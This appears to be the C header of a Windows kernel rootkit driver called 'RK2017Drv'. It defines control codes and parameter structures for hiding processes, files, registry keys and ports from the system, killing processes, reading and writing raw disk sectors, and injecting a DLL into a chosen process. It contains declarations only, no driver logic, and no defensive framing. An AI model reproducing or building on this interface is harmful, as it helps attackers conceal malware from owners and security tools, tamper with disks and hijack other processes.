#ifndef __IO_CTL_CODE_H__
#define __IO_CTL_CODE_H__

#define RK2017_BASENAME			L"RK2017Drv"
#define RK2017_DEVNAME			L"\\Device\\" RK2017_BASENAME
#define RK2017_LINKNAME			L"\\DosDevices\\" RK2017_BASENAME
#define RK2017_USERLINK			L"\\\\.\\" RK2017_BASENAME

//#define IOCTL(n) CTL_CODE(FILE_DEVICE_UNKNOWN,n,METHOD_BUFFERED,0)

#define IOCTL(n) CTL_CODE(FILE_DEVICE_UNKNOWN,n,METHOD_BUFFERED,0)

#define IOC(ops) IOCTL_ ## ops
#define IOP(ops) struct ops ## _params
#define IOR(ops) struct ops ## _returns
#define IOS(ops) struct ops ## _shared

#pragma pack(1)

IOP(RkHideProcess)
{
	BOOLEAN bIsAddHide;
	ULONG ulProcessId;
	CHAR ProcessName[300];
};
enum
{
	IOC(RkHideProcess) = IOCTL('Rkhp')
};


IOP(RkHideFile)
{
	BOOLEAN bIsAddHide;
	WCHAR FileNameW[300];
};
enum
{
	IOC(RkHideFile) = IOCTL('Rkhf')
};

IOP(RkHideRegister)
{
	BOOLEAN bIsAddHide;
	WCHAR RegisterPath[512];
};
enum
{
	IOC(RkHideRegister) = IOCTL('Rkhr')
};

IOP(RkHidePort)
{
	BOOLEAN bIsAddHide;
	ULONG ulPort;
};
enum
{
	IOC(RkHidePort) = IOCTL('Rkht')
};

IOP(RkKillProcess)
{
	HANDLE hKillPId;
	CHAR ProcessName[MAX_PATH];
};
enum
{
	IOC(RkKillProcess) = IOCTL('Rkkp')
};

#define  SECTOR_SIZE (4 * 1024)
enum
{
	IOC(ReadSector) = IOCTL('Rsec')
};

IOP(ReadSector)
{
	ULONG	ulDiskIndex;
	ULONG	ulStartSector;
	ULONG	ulSectorSize;
	ULONG	ulLength;
	CHAR OrgSector[SECTOR_SIZE];
	char NewSector[SECTOR_SIZE];
};
enum
{
	IOC(WriteSector) = IOCTL('Wsec')
};

IOP(WriteSector)
{
	ULONG	ulDiskIndex;
	ULONG	ulStartSector;
	ULONG	ulSectorSize;
	ULONG	ulLength;
	CHAR OrgSector[SECTOR_SIZE];
	char NewSector[SECTOR_SIZE];
};
enum
{
	IOC(InjectKtrapFrame) = IOCTL('IjkF')
};

IOP(InjectKtrapFrame)
{
	ULONG ulPid;
	CHAR pInjectProcessName[MAX_PATH];
	CHAR pInjectDllPath[MAX_PATH];
};
#pragma pack()

#endif
